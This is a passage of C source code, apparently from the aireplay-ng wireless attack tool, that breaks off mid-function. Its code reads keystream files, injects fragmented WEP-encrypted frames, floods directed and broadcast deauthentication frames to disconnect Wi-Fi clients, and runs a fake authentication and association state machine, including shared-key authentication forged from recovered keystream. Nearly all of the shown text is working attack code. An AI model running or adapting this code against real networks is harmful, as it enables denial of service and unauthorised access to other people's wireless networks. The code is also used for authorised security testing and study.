printf( \" (WPA)\" );\n        }\n\n        printf( \"\\n\\n\" );\n\n        if (is_wds) {\n            printf( \"        Transmitter  =  %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                    h80211[mi_t    ], h80211[mi_t + 1],\n                    h80211[mi_t + 2], h80211[mi_t + 3],\n                    h80211[mi_t + 4], h80211[mi_t + 5] );\n\n            printf( \"           Receiver  =  %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                    h80211[mi_r    ], h80211[mi_r + 1],\n                    h80211[mi_r + 2], h80211[mi_r + 3],\n                    h80211[mi_r + 4], h80211[mi_r + 5] );\n        } else {\n            printf( \"              BSSID  =  %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                    h80211[mi_b    ], h80211[mi_b + 1],\n                    h80211[mi_b + 2], h80211[mi_b + 3],\n                    h80211[mi_b + 4], h80211[mi_b + 5] );\n        }\n\n        printf( \"          Dest. MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                h80211[mi_d    ], h80211[mi_d + 1],\n                h80211[mi_d + 2], h80211[mi_d + 3],\n                h80211[mi_d + 4], h80211[mi_d + 5] );\n\n        printf( \"         Source MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\\n\",\n                h80211[mi_s    ], h80211[mi_s + 1],\n                h80211[mi_s + 2], h80211[mi_s + 3],\n                h80211[mi_s + 4], h80211[mi_s + 5] );\n\n        /* print a hex dump of the packet */\n\n        for( i = 0; i < *caplen; i++ )\n        {\n            if( ( i & 15 ) == 0 )\n            {\n                if( i == 224 )\n                {\n                    printf( \"\\n        --- CUT ---\" );\n                    break;\n                }\n\n                printf( \"\\n        0x%04x:  \", i );\n            }\n\n            printf( \"%02x\", h80211[i] );\n\n            if( ( i & 1 ) != 0 )\n                printf( \" \" );\n\n            if( i == *caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )\n            {\n                for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )\n                {\n                    printf( \"  \" );\n                    if( ( j & 1 ) != 0 )\n                        printf( \" \" );\n                }\n\n                printf( \" \" );\n\n                for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )\n                    printf( \"%c\", ( h80211[i - 15 + j] <  32 ||\n                                    h80211[i - 15 + j] > 126 )\n                                  ? '.' : h80211[i - 15 + j] );\n            }\n\n            if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )\n            {\n                printf( \" \" );\n\n                for( j = 0; j < 16; j++ )\n                    printf( \"%c\", ( h80211[i - 15 + j] <  32 ||\n                                    h80211[i - 15 + j] > 127 )\n                                  ? '.' : h80211[i - 15 + j] );\n            }\n        }\n\n        printf( \"\\n\\nUse this packet ? \" );\n        fflush( stdout );\n        ret=0;\n        while(!ret) ret = scanf( \"%s\", tmpbuf );\n        printf( \"\\n\" );\n\n        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )\n            break;\n    }\n\n    if(!just_grab)\n    {\n        pfh_out.magic         = TCPDUMP_MAGIC;\n        pfh_out.version_major = PCAP_VERSION_MAJOR;\n        pfh_out.version_minor = PCAP_VERSION_MINOR;\n        pfh_out.thiszone      = 0;\n        pfh_out.sigfigs       = 0;\n        pfh_out.snaplen       = 65535;\n        pfh_out.linktype      = LINKTYPE_IEEE802_11;\n\n        lt = localtime( (const time_t *) &tv.tv_sec );\n\n        memset( strbuf, 0, sizeof( strbuf ) );\n        snprintf( strbuf,  sizeof( strbuf ) - 1,\n                \"replay_src-%02d%02d-%02d%02d%02d.cap\",\n                lt->tm_mon + 1, lt->tm_mday,\n                lt->tm_hour, lt->tm_min, lt->tm_sec );\n\n        printf( \"Saving chosen packet in %s\\n\", strbuf );\n\n        if( ( f_cap_out = fopen( strbuf, \"wb+\" ) ) == NULL )\n        {\n            perror( \"fopen failed\" );\n            return( 1 );\n        }\n\n        n = sizeof( struct pcap_file_header );\n\n        if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )\n        {\n        \tfclose(f_cap_out);\n            perror( \"fwrite failed\\n\" );\n            return( 1 );\n        }\n\n        pkh.tv_sec  = tv.tv_sec;\n        pkh.tv_usec = tv.tv_usec;\n        pkh.caplen  = *caplen;\n        pkh.len     = *caplen;\n\n        n = sizeof( pkh );\n\n        if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )\n        {\n        \tfclose(f_cap_out);\n            perror( \"fwrite failed\" );\n            return( 1 );\n        }\n\n        n = pkh.caplen;\n\n        if( fwrite( h80211, n, 1, f_cap_out ) != 1 )\n        {\n        \tfclose(f_cap_out);\n            perror( \"fwrite failed\" );\n            return( 1 );\n        }\n\n        fclose( f_cap_out );\n    }\n\n    return( 0 );\n}\n\nint read_prga(unsigned char **dest, char *file)\n{\n    FILE *f;\n    int size;\n\n    if(file == NULL) return( 1 );\n    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);\n\n    f = fopen(file, \"r\");\n\n    if(f == NULL)\n    {\n         printf(\"Error opening %s\\n\", file);\n         return( 1 );\n    }\n\n    fseek(f, 0, SEEK_END);\n    size = ftell(f);\n    rewind(f);\n\n    if(size > 1500) size = 1500;\n\n    if( fread( (*dest), size, 1, f ) != 1 )\n    {\n    \tfclose(f);\n        fprintf( stderr, \"fread failed\\n\" );\n        return( 1 );\n    }\n\n    opt.prgalen = size;\n\n    fclose(f);\n    return( 0 );\n}\n\nvoid add_icv(unsigned char *input, int len, int offset)\n{\n    unsigned long crc = 0xFFFFFFFF;\n    int n=0;\n\n    for( n = offset; n < len; n++ )\n        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);\n\n    crc = ~crc;\n\n    input[len]   = (crc      ) & 0xFF;\n    input[len+1] = (crc >>  8) & 0xFF;\n    input[len+2] = (crc >> 16) & 0xFF;\n    input[len+3] = (crc >> 24) & 0xFF;\n\n    return;\n}\n\nvoid send_fragments(unsigned char *packet, int packet_len, unsigned char *iv, unsigned char *keystream, int fragsize, int ska)\n{\n    int t, u;\n    int data_size;\n    unsigned char frag[32+fragsize];\n    int pack_size;\n    int header_size=24;\n\n    data_size = packet_len-header_size;\n    packet[23] = (rand() % 0xFF);\n\n    for (t=0; t+=fragsize;)\n    {\n\n    //Copy header\n        memcpy(frag, packet, header_size);\n\n    //Copy IV + KeyIndex\n        memcpy(frag+header_size, iv, 4);\n\n    //Copy data\n        if(fragsize <= packet_len-(header_size+t-fragsize))\n            memcpy(frag+header_size+4, packet+header_size+t-fragsize, fragsize);\n        else\n            memcpy(frag+header_size+4, packet+header_size+t-fragsize, packet_len-(header_size+t-fragsize));\n\n    //Make ToDS frame\n        if(!ska)\n        {\n            frag[1] |= 1;\n            frag[1] &= 253;\n        }\n\n    //Set fragment bit\n        if (t< data_size) frag[1] |= 4;\n        if (t>=data_size) frag[1] &= 251;\n\n    //Fragment number\n        frag[22] = 0;\n        for (u=t; u-=fragsize;)\n        {\n            frag[22] += 1;\n        }\n//        frag[23] = 0;\n\n    //Calculate packet length\n        if(fragsize <= packet_len-(header_size+t-fragsize))\n            pack_size = header_size + 4 + fragsize;\n        else\n            pack_size = header_size + 4 + (packet_len-(header_size+t-fragsize));\n\n    //Add ICV\n        add_icv(frag, pack_size, header_size + 4);\n        pack_size += 4;\n\n    //Encrypt\n        xor_keystream(frag + header_size + 4, keystream, fragsize+4);\n\n    //Send\n        send_packet(frag, pack_size);\n        if (t<data_size)usleep(100);\n\n        if (t>=data_size) break;\n    }\n\n}\n\nint do_attack_deauth( void )\n{\n    int i, n;\n    int aacks, sacks, caplen;\n    struct timeval tv;\n    fd_set rfds;\n\n    if(getnet(NULL, 0, 1) != 0)\n        return 1;\n\n    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )\n        printf( \"NB: this attack is more effective when targeting\\n\"\n                \"a connected wireless client (-c <client's mac>).\\n\" );\n\n    n = 0;\n\n    while( 1 )\n    {\n        if( opt.a_count > 0 && ++n > opt.a_count )\n            break;\n\n        usleep( 180000 );\n\n        if( memcmp( opt.r_dmac, NULL_MAC, 6 ) != 0 )\n        {\n            /* deauthenticate the target */\n\n            memcpy( h80211, DEAUTH_REQ, 26 );\n            memcpy( h80211 + 16, opt.r_bssid, 6 );\n\n            aacks = 0;\n            sacks = 0;\n            for( i = 0; i < 64; i++ )\n            {\n                if(i == 0)\n                {\n                    PCT; printf( \"Sending 64 directed DeAuth. STMAC:\"\n                                \" [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\\r\",\n                                opt.r_dmac[0],  opt.r_dmac[1],\n                                opt.r_dmac[2],  opt.r_dmac[3],\n                                opt.r_dmac[4],  opt.r_dmac[5],\n                                sacks, aacks );\n                }\n\n                memcpy( h80211 +  4, opt.r_dmac,  6 );\n                memcpy( h80211 + 10, opt.r_bssid, 6 );\n\n                if( send_packet( h80211, 26 ) < 0 )\n                    return( 1 );\n\n                usleep( 2000 );\n\n                memcpy( h80211 +  4, opt.r_bssid, 6 );\n                memcpy( h80211 + 10, opt.r_dmac,  6 );\n\n                if( send_packet( h80211, 26 ) < 0 )\n                    return( 1 );\n\n                usleep( 2000 );\n\n                while( 1 )\n                {\n                    FD_ZERO( &rfds );\n                    FD_SET( dev.fd_in, &rfds );\n\n                    tv.tv_sec  = 0;\n                    tv.tv_usec = 1000;\n\n                    if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )\n                    {\n                        if( errno == EINTR ) continue;\n                        perror( \"select failed\" );\n                        return( 1 );\n                    }\n\n                    if( ! FD_ISSET( dev.fd_in, &rfds ) )\n                        break;\n\n                    caplen = read_packet( tmpbuf, sizeof( tmpbuf ), NULL );\n\n                    if(caplen <= 0 ) break;\n                    if(caplen != 10) continue;\n                    if( tmpbuf[0] == 0xD4)\n                    {\n                        if( memcmp(tmpbuf+4, opt.r_dmac, 6) == 0 )\n                        {\n                            aacks++;\n                        }\n                        if( memcmp(tmpbuf+4, opt.r_bssid, 6) == 0 )\n                        {\n                            sacks++;\n                        }\n                        PCT; printf( \"Sending 64 directed DeAuth. STMAC:\"\n                                    \" [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\\r\",\n                                    opt.r_dmac[0],  opt.r_dmac[1],\n                                    opt.r_dmac[2],  opt.r_dmac[3],\n                                    opt.r_dmac[4],  opt.r_dmac[5],\n                                    sacks, aacks );\n                    }\n                }\n            }\n            printf(\"\\n\");\n        }\n        else\n        {\n            /* deauthenticate all stations */\n\n            PCT; printf( \"Sending DeAuth to broadcast -- BSSID:\"\n                         \" [%02X:%02X:%02X:%02X:%02X:%02X]\\n\",\n                         opt.r_bssid[0], opt.r_bssid[1],\n                         opt.r_bssid[2], opt.r_bssid[3],\n                         opt.r_bssid[4], opt.r_bssid[5] );\n\n            memcpy( h80211, DEAUTH_REQ, 26 );\n\n            memcpy( h80211 +  4, BROADCAST,   6 );\n            memcpy( h80211 + 10, opt.r_bssid, 6 );\n            memcpy( h80211 + 16, opt.r_bssid, 6 );\n\n            for( i = 0; i < 128; i++ )\n            {\n                if( send_packet( h80211, 26 ) < 0 )\n                    return( 1 );\n\n                usleep( 2000 );\n            }\n        }\n    }\n\n    return( 0 );\n}\n\nint do_attack_fake_auth( void )\n{\n    time_t tt, tr;\n    struct timeval tv, tv2, tv3;\n\n    fd_set rfds;\n    int i, n, state, caplen, z;\n    int mi_b, mi_s, mi_d;\n    int x_send;\n    int kas;\n    int tries;\n    int retry = 0;\n    int abort;\n    int gotack = 0;\n    unsigned char capa[2];\n    int deauth_wait=3;\n    int ska=0;\n    int keystreamlen=0;\n    int challengelen=0;\n    int weight[16];\n    int notice=0;\n    int packets=0;\n    int aid=0;\n\n    unsigned char ackbuf[14];\n    unsigned char ctsbuf[10];\n    unsigned char iv[4];\n    unsigned char challenge[2048];\n    unsigned char keystream[2048];\n\n\n    if( memcmp( opt.r_smac,  NULL_MAC, 6 ) == 0 )\n    {\n        printf( \"Please specify a source MAC (-h).\\n\" );\n        return( 1 );\n    }\n\n    if(getnet(capa, 0, 1) != 0)\n        return 1;\n\n    if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)\n    {\n        printf( \"Please specify an ESSID (-e).\\n\" );\n        return 1;\n    }\n\n    memcpy( ackbuf, \"\\xD4\\x00\\x00\\x00\", 4 );\n    memcpy( ackbuf +  4, opt.r_bssid, 6 );\n    memset( ackbuf + 10, 0, 4 );\n\n    memcpy( ctsbuf, \"\\xC4\\x00\\x94\\x02\", 4 );\n    memcpy( ctsbuf +  4, opt.r_bssid, 6 );\n\n    tries = 0;\n    abort = 0;\n    state = 0;\n    x_send=opt.npackets;\n    if(opt.npackets == 0)\n        x_send=4;\n\n    if(opt.prga != NULL)\n        ska=1;\n\n    tt = time( NULL );\n    tr = time( NULL );\n\n    while( 1 )\n    {\n        switch( state )\n        {\n            case 0:\n\t\t\t\tif (opt.f_retry > 0) {\n\t\t\t\t\tif (retry == opt.f_retry) {\n\t\t\t\t\t\tabort = 1;\n\t\t\t\t\t\treturn 1;\n\t\t\t\t\t}\n\t\t\t\t\t++retry;\n\t\t\t\t}\n\n                if(ska && keystreamlen == 0)\n                {\n                    opt.fast = 1;  //don't ask for approval\n                    memcpy(opt.f_bssid, opt.r_bssid, 6);    //make the filter bssid the same, that is used for auth'ing\n                    if(opt.prga==NULL)\n                    {\n                        while(keystreamlen < 16)\n                        {\n                            capture_ask_packet(&caplen, 1);    //wait for data packet\n                            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;\n                            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */\n                                z+=2;\n\n                            memcpy(iv, h80211+z, 4); //copy IV+IDX\n                            i = known_clear(keystream, &keystreamlen, weight, h80211, caplen-z-4-4); //recover first bytes\n                            if(i>1)\n                            {\n                                keystreamlen=0;\n                            }\n                            for(i=0;i<keystreamlen;i++)\n                                keystream[i] ^= h80211[i+z+4];\n                        }\n                    }\n                    else\n                    {\n                        keystreamlen = opt.prgalen-4;\n                        memcpy(iv, opt.prga, 4);\n                        memcpy(keystream, opt.prga+4, keystreamlen);\n                    }\n                }\n\n                state = 1;\n                tt = time( NULL );\n\n                /* attempt to authenticate */\n\n                memcpy( h80211, AUTH_REQ, 30 );\n                memcpy( h80211 +  4, opt.r_bssid, 6 );\n                memcpy( h80211 + 10, opt.r_smac , 6 );\n                memcpy( h80211 + 16, opt.r_bssid, 6 );\n                if(ska)\n                    h80211[24]=0x01;\n\n                printf(\"\\n\");\n                PCT; printf( \"Sending Authentication Request\" );\n                if(!ska)\n                    printf(\" (Open System)\");\n                else\n                    printf(\" (Shared Key)\");\n                fflush( stdout );\n                gotack=0;\n\n                for( i = 0; i < x_send; i++ )\n                {\n                    if( send_packet( h80211, 30 ) < 0 )\n                        return( 1 );\n\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                }\n\n                break;\n\n            case 1:\n\n                /* waiting for an authentication response */\n\n                if( time( NULL ) - tt >= 2 )\n                {\n                    if(opt.npackets > 0)\n                    {\n                        tries++;\n\n                        if( tries > 15  )\n                        {\n                            abort = 1;\n                        }\n                    }\n                    else\n                    {\n                        if( x_send < 256 )\n                        {\n                            x_send *= 2;\n                        }\n                        else\n                        {\n                            abort = 1;\n                        }\n                    }\n\n                    if( abort )\n                    {\n                        printf(\n    \"\\nAttack was unsuccessful. Possible reasons:\\n\\n\"\n    \"    * Perhaps MAC address filtering is enabled.\\n\"\n    \"    * Check that the BSSID (-a option) is correct.\\n\"\n    \"    * Try to change the number of packets (-o option).\\n\"\n    \"    * The driver/card doesn't support injection.\\n\"\n    \"    * This attack sometimes fails against some APs.\\n\"\n    \"    * The card is not on the same channel as the AP.\\n\"\n    \"    * You're too far from the AP. Get closer, or lower\\n\"\n    \"      the transmit rate.\\n\\n\" );\n                        return( 1 );\n                    }\n\n                    state = 0;\n                    challengelen = 0;\n                    printf(\"\\n\");\n                }\n\n                break;\n\n            case 2:\n\n                state = 3;\n                tt = time( NULL );\n\n                /* attempt to authenticate using ska */\n\n                memcpy( h80211, AUTH_REQ, 30 );\n                memcpy( h80211 +  4, opt.r_bssid, 6 );\n                memcpy( h80211 + 10, opt.r_smac , 6 );\n                memcpy( h80211 + 16, opt.r_bssid, 6 );\n                h80211[1] |= 0x40; //set wep bit, as this frame is encrypted\n                memcpy(h80211+24, iv, 4);\n                memcpy(h80211+28, challenge, challengelen);\n                h80211[28] = 0x01; //its always ska in state==2\n                h80211[30] = 0x03; //auth sequence number 3\n                fflush(stdout);\n\n                if(keystreamlen < challengelen+4 && notice == 0)\n                {\n                    notice = 1;\n                    if(opt.prga != NULL)\n                    {\n                        PCT; printf( \"Specified xor file (-y) is too short, you need at least %d keystreambytes.\\n\", challengelen+4);\n                    }\n                    else\n                    {\n                        PCT; printf( \"You should specify a xor file (-y) with at least %d keystreambytes\\n\", challengelen+4);\n                    }\n                    PCT; printf( \"Trying fragmented shared key fake auth.\\n\");\n                }\n                PCT; printf( \"Sending encrypted challenge.\" );\n                fflush( stdout );\n                gotack=0;\n                gettimeofday(&tv2, NULL);\n\n                for( i = 0; i < x_send; i++ )\n                {\n                    if(keystreamlen < challengelen+4)\n                    {\n                        packets=(challengelen)/(keystreamlen-4);\n                        if( (challengelen)%(keystreamlen-4) != 0 )\n                            packets++;\n\n                        memcpy(h80211+24, challenge, challengelen);\n                        h80211[24]=0x01;\n                        h80211[26]=0x03;\n                        send_fragments(h80211, challengelen+24, iv, keystream, keystreamlen-4, 1);\n                    }\n                    else\n                    {\n                        add_icv(h80211, challengelen+28, 28);\n                        xor_keystream(h80211+28, keystream, challengelen+4);\n                        send_packet(h80211, 24+4+challengelen+4);\n                    }\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                }\n\n                break;\n\n            case 3:\n\n                /* waiting for an authentication response (using ska) */\n\n                if( time( NULL ) - tt >= 2 )\n                {\n                    if(opt.npackets > 0)\n                    {\n                        tries++;\n\n                        if( tries > 15  )\n                        {\n                            abort = 1;\n                        }\n                    }\n                    else\n                    {\n                        if( x_send < 256 )\n                        {\n                            x_send *= 2;\n                        }\n                        else\n                        {\n                            abort = 1;\n                        }\n                    }\n\n                    if( abort )\n                    {\n                        printf(\n    \"\\nAttack was unsuccessful. Possible reasons:\\n\\n\"\n    \"    * Perhaps MAC address filtering is enabled.\\n\"\n    \"    * Check that the BSSID (-a option) is correct.\\n\"\n    \"    * Try to change the number of packets (-o option).\\n\"\n    \"    * The driver/card doesn't support injection.\\n\"\n    \"    * This attack sometimes fails against some APs.\\n\"\n    \"    * The card is not on the same channel as the AP.\\n\"\n    \"    * You're too far from the AP. Get closer, or lower\\n\"\n    \"      the transmit rate.\\n\\n\" );\n                        return( 1 );\n                    }\n\n                    state = 0;\n                    challengelen=0;\n                    printf(\"\\n\");\n                }\n\n                break;\n\n            case 4:\n\n                tries = 0;\n                state = 5;\n                if(opt.npackets == -1) x_send *= 2;\n                tt = time( NULL );\n\n                /* attempt to associate */\n\n                memcpy( h80211, ASSOC_REQ, 28 );\n                memcpy( h80211 +  4, opt.r_bssid, 6 );\n                memcpy( h80211 + 10, opt.r_smac , 6 );\n                memcpy( h80211 + 16, opt.r_bssid, 6 );\n\n                n = strlen( opt.r_essid );\n                if( n > 32 ) n = 32;\n\n                h80211[28] = 0x00;\n                h80211[29] = n;\n\n                memcpy( h80211 + 30, opt.r_essid,  n );\n                memcpy( h80211 + 30 + n, RATES, 16 );\n                memcpy( h80211 + 24, capa, 2);\n\n                PCT; printf( \"Sending Association Request\" );\n                fflush( stdout );\n                gotack=0;\n\n                for( i = 0; i < x_send; i++ )\n                {\n                    if( send_packet( h80211, 46 + n ) < 0 )\n                        return( 1 );\n\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                }\n\n                break;\n\n            case 5:\n\n                /* waiting for an association response */\n\n                if( time( NULL ) - tt >= 5 )\n                {\n                    if( x_send < 256 && (opt.npackets == -1) )\n                        x_send *= 4;\n\n                    state = 0;\n                    challengelen = 0;\n                    printf(\"\\n\");\n                }\n\n                break;\n\n            case 6:\n\n                if( opt.a_delay == 0 && opt.reassoc == 0 )\n                {\n                    printf(\"\\n\");\n                    return( 0 );\n                }\n\n                if( opt.a_delay == 0 && opt.reassoc == 1 )\n                {\n                    if(opt.npackets == -1) x_send = 4;\n                    state = 7;\n                    challengelen = 0;\n                    break;\n                }\n\n                if( time( NULL ) - tt >= opt.a_delay )\n                {\n                    if(opt.npackets == -1) x_send = 4;\n                    if( opt.reassoc == 1 ) state = 7;\n                    else state = 0;\n                    challengelen = 0;\n                    break;\n                }\n\n                if( time( NULL ) - tr >= opt.delay )\n                {\n                    tr = time( NULL );\n                    printf(\"\\n\");\n                    PCT; printf( \"Sending keep-alive packet\" );\n                    fflush( stdout );\n                    gotack=0;\n\n                    memcpy( h80211, NULL_DATA, 24 );\n                    memcpy( h80211 +  4, opt.r_bssid, 6 );\n                    memcpy( h80211 + 10, opt.r_smac,  6 );\n                    memcpy( h80211 + 16, opt.r_bssid, 6 );\n\n                    if( opt.npackets > 0 ) kas = opt.npackets;\n                    else kas = 32;\n\n                    for( i = 0; i < kas; i++ )\n                        if( send_packet( h80211, 24 ) < 0 )\n                            return( 1 );\n                }\n\n                break;\n\n            case 7:\n\n                /* sending reassociation request */\n\n                tries = 0;\n                state = 8;\n                if(opt.npackets == -1) x_send *= 2;\n                tt = time( NULL );\n\n                /* attempt to reassociate */\n\n                memcpy( h80211, REASSOC_REQ, 34 );\n                memcpy( h80211 +  4, opt.r_bssid, 6 );\n                memcpy( h80211 + 10, opt.r_smac , 6 );\n                memcpy( h80211 + 16, opt.r_bssid, 6 );\n\n                n = strlen( opt.r_essid );\n                if( n > 32 ) n = 32;\n\n                h80211[34] = 0x00;\n                h80211[35] = n;\n\n                memcpy( h80211 + 36, opt.r_essid,  n );\n                memcpy( h80211 + 36 + n, RATES, 16 );\n                memcpy( h80211 + 30, capa, 2);\n\n                PCT; printf( \"Sending Reassociation Request\" );\n                fflush( stdout );\n                gotack=0;\n\n                for( i = 0; i < x_send; i++ )\n                {\n                    if( send_packet( h80211, 52 + n ) < 0 )\n                        return( 1 );\n\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                    usleep(10);\n\n                    if( send_packet( ackbuf, 14 ) < 0 )\n                        return( 1 );\n                }\n\n                break;\n\n            case 8:\n\n                /* waiting for a reassociation response */\n\n                if( time( NULL ) - tt >= 5 )\n                {\n                    if( x_send < 256 && (opt.npackets == -1) )\n                        x_send *= 4;\n\n                    state = 7;\n                    challengelen = 0;\n                    printf(\"\\n\");\n                }\n\n                break;\n\n            default: break;\n        }\n\n        /* read one frame */\n\n        FD_ZERO( &rfds );\n        FD_SET( dev.fd_in, &rfds );\n\n        tv.tv_sec  = 1;\n        tv.tv_usec = 0;\n\n        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )\n        {\n            if( errno == EINTR ) continue;\n            perror( \"select failed\" );\n            return( 1 );\n        }\n\n        if( ! FD_ISSET( dev.fd_in, &rfds ) )\n            continue;\n\n        caplen = read_packet( h80211, sizeof( h80211 ), NULL );\n\n        if( caplen  < 0 ) return( 1 );\n        if( caplen == 0 ) continue;\n\n        if( caplen == 10 && h80211[0] == 0xD4)\n        {\n            if( memcmp(h80211+4, opt.r_smac, 6) == 0 )\n            {\n                gotack++;\n                if(gotack==1)\n                {\n                    printf(\" [ACK]\");\n                    fflush( stdout );\n                }\n            }\n        }\n\n        gettimeofday(&tv3, NULL);\n\n        //wait 100ms for acks\n        if ( (((tv3.tv_sec*1000000 - tv2.tv_sec*1000000) + (tv3.tv_usec - tv2.tv_usec)) > (100*1000)) &&\n              (gotack > 0) && (gotack < packets) && (state == 3) && (packets > 1) )\n        {\n            PCT; printf(\"Not enough acks, repeating...\\n\");\n            state=2;\n            continue;\n        }\n\n        if( caplen < 24 )\n            continue;\n\n        switch( h80211[1] & 3 )\n        {\n            case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;\n            case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;\n            case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;\n            default: mi_b = 10; mi_d = 16; mi_s = 24; break;\n        }\n\n        /* check if the dest. MAC is ours and source == AP */\n\n        if( memcmp( h80211 + mi_d, opt.r_smac,  6 ) == 0 &&\n            memcmp( h80211 + mi_b, opt.r_bssid, 6 ) == 0 &&\n            memcmp( h80211 + mi_s, opt.r_bssid, 6 ) == 0 )\n        {\n            /* check if we got an deauthentication packet */\n\n            if( h80211[0] == 0xC0 ) //removed && state == 4\n            {\n                printf(\"\\n\");\n                PCT; printf( \"Got a deauthentication packet! (Waiting %d seconds)\\n\", deauth_wait );\n                if(opt.npackets == -1) x_send = 4;\n                state = 0;\n                challengelen = 0;\n                read_sleep( deauth_wait * 1000000 );\n                deauth_wait += 2;\n                continue;\n            }\n\n            /* check if we got an disassociation packet */\n\n            if( h80211[0] == 0xA0 && state == 6 )\n            {\n                printf(\"\\n\");\n                PCT; printf( \"Got a disassociation packet! (Waiting %d seconds)\\n\", deauth_wait );\n                if(opt.npackets == -1) x_send = 4;\n                state = 0;\n                challengelen = 0;\n                read_sleep( deauth_wait );\n                deauth_wait += 2;\n                continue;\n            }\n\n            /* check if we got an authentication response */\n\n            if( h80211[0] == 0xB0 && (state == 1 || state == 3) )\n            {\n                if(ska)\n                {\n                    if( (state==1 && h80211[26] != 0x02) || (state==3 && h80211[26] != 0x04) )\n                        continue;\n                }\n\n                printf(\"\\n\");\n                PCT;\n\n                state = 0;\n\n                if( caplen < 30 )\n                {\n                    printf( \"Error: packet length < 30 bytes\\n\" );\n                    read_sleep( 3*1000000 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                if( (h80211[24] != 0 || h80211[25] != 0) && ska==0)\n                {\n                    ska=1;\n                    printf(\"Switching to shared key authentication\\n\");\n                    read_sleep(2*1000000);  //read sleep 2s\n                    challengelen = 0;\n                    continue;\n                }\n\n                n = h80211[28] + ( h80211[29] << 8 );\n\n                if( n != 0 )\n                {\n                    switch( n )\n                    {\n                    case  1:\n                        printf( \"AP rejects the source MAC address (%02X:%02X:%02X:%02X:%02X:%02X) ?\\n\",\n                                opt.r_smac[0], opt.r_smac[1], opt.r_smac[2],\n                                opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );\n                        break;\n\n                    case 10:\n                        printf( \"AP rejects our capabilities\\n\" );\n                        break;\n\n                    case 13:\n                    case 15:\n                        ska=1;\n                        if(h80211[26] == 0x02)\n                            printf(\"Switching to shared key authentication\\n\");\n                        if(h80211[26] == 0x04)\n                        {\n                            printf(\"Challenge failure\\n\");\n                            challengelen=0;\n                        }\n                        read_sleep(2*1000000);  //read sleep 2s\n                        challengelen = 0;\n                        continue;\n                    default:\n                        break;\n                    }\n\n                    printf( \"Authentication failed (code %d)\\n\", n );\n                    if(opt.npackets == -1) x_send = 4;\n                    read_sleep( 3*1000000 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                if(ska && h80211[26]==0x02 && challengelen == 0)\n                {\n                    memcpy(challenge, h80211+24, caplen-24);\n                    challengelen=caplen-24;\n                }\n                if(ska)\n                {\n                    if(h80211[26]==0x02)\n                    {\n                        state = 2;      /* grab challenge */\n                        printf( \"Authentication 1/2 successful\\n\" );\n                    }\n                    if(h80211[26]==0x04)\n                    {\n                        state = 4;\n                        printf( \"Authentication 2/2 successful\\n\" );\n                    }\n                }\n                else\n                {\n                    printf( \"Authentication successful\\n\" );\n                    state = 4;      /* auth. done */\n                }\n            }\n\n            /* check if we got an association response */\n\n            if( h80211[0] == 0x10 && state == 5 )\n            {\n                printf(\"\\n\");\n                state = 0; PCT;\n\n                if( caplen < 30 )\n                {\n                    printf( \"Error: packet length < 30 bytes\\n\" );\n                    sleep( 3 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                n = h80211[26] + ( h80211[27] << 8 );\n\n                if( n != 0 )\n                {\n                    switch( n )\n                    {\n                    case  1:\n                        printf( \"Denied (code  1), is WPA in use ?\\n\" );\n                        break;\n\n                    case 10:\n                        printf( \"Denied (code 10), open (no WEP) ?\\n\" );\n                        break;\n\n                    case 12:\n                        printf( \"Denied (code 12), wrong ESSID or WPA ?\\n\" );\n                        break;\n\n                    default:\n                        printf( \"Association denied (code %d)\\n\", n );\n                        break;\n                    }\n\n                    sleep( 3 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                aid=( ( (h80211[29] << 8) || (h80211[28]) ) & 0x3FFF);\n                printf( \"Association successful :-) (AID: %d)\\n\", aid );\n                deauth_wait = 3;\n                fflush( stdout );\n\n                tt = time( NULL );\n                tr = time( NULL );\n\n                state = 6;      /* assoc. done */\n            }\n\n            /* check if we got an reassociation response */\n\n            if( h80211[0] == 0x30 && state == 8 )\n            {\n                printf(\"\\n\");\n                state = 7; PCT;\n\n                if( caplen < 30 )\n                {\n                    printf( \"Error: packet length < 30 bytes\\n\" );\n                    sleep( 3 );\n                    challengelen = 0;\n                    continue;\n                }\n\n                n = h80211[26] + ( h80211[27] << 8 );\n\n                if( n != 0 )\n                {\n                    switch( n )\n                    {\n                    case  1:\n                        printf( \"Denied (code  1), is WPA in use ?\\n\" );\n                        break;\n\n                    case 10:\n                        printf( \"Denied (code 10), open (no WEP) ?\\n\" );\n                        break;\n\n                    case 12:\n                        printf( \"Denied (code 12), wrong 